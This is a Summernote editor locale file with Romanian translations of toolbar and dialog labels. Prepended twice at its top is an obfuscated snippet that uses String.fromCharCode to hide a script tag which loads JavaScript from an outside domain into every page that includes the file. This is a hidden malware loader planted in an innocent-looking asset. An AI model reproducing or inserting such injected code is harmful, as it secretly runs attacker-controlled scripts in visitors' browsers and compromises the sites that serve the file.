Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'ro-RO': {
      font: {
        bold: 'Îngroșat',
        italic: 'Înclinat',
        underline: 'Subliniat',
        clear: 'Înlătură formatare font',
        height: 'Înălțime rând',
        strikethrough: 'Tăiat',
        size: 'Dimensiune font'
      },
      image: {
        image: 'Imagine',
        insert: 'Inserează imagine',
        resizeFull: 'Redimensionează complet',
        resizeHalf: 'Redimensionează 1/2',
        resizeQuarter: 'Redimensionează 1/4',
        floatLeft: 'Aliniere la stânga',
        floatRight: 'Aliniere la dreapta',
        floatNone: 'Fară aliniere',
        dragImageHere: 'Trage o imagine aici',
        selectFromFiles: 'Alege din fişiere',
        url: 'URL imagine'
      },
      link: {
        link: 'Link',
        insert: 'Inserează link',
        unlink: 'Înlătură link',
        edit: 'Editează',
        textToDisplay: 'Text ce va fi afişat',
        url: 'Deschidere în fereastra nouă?'
      },
      table: {
        table: 'Tabel'
      },
      hr: {
        insert: 'Inserează o linie orizontală'
      },
      style: {
        style: 'Stil',
        normal: 'Normal',
        blockquote: 'Citat',
        pre: 'Preformatat',
        h1: 'Titlu 1',
        h2: 'Titlu 2',
        h3: 'Titlu 3',
        h4: 'Titlu 4',
        h5: 'Titlu 5',
        h6: 'Titlu 6'
      },
      lists: {
        unordered: 'Listă neordonată',
        ordered: 'Listă ordonată'
      },
      options: {
        help: 'Ajutor',
        fullscreen: 'Măreşte',
        codeview: 'Sursă'
      },
      paragraph: {
        paragraph: 'Paragraf',
        outdent: 'Creşte identarea',
        indent: 'Scade identarea',
        left: 'Aliniere la stânga',
        center: 'Aliniere centrală',
        right: 'Aliniere la dreapta',
        justify: 'Aliniere în bloc'
      },
      color: {
        recent: 'Culoare recentă',
        more: 'Mai multe  culori',
        background: 'Culoarea fundalului',
        foreground: 'Culoarea textului',
        transparent: 'Transparent',
        setTransparent: 'Setează transparent',
        reset: 'Resetează',
        resetToDefault: 'Revino la iniţial'
      },
      shortcut: {
        shortcuts: 'Scurtături tastatură',
        close: 'Închide',
        textFormatting: 'Formatare text',
        action: 'Acţiuni',
        paragraphFormatting: 'Formatare paragraf',
        documentStyle: 'Stil paragraf'
      },
      history: {
        undo: 'Starea anterioară',
        redo: 'Starea ulterioară'
      }

    }
  });
})(jQuery);
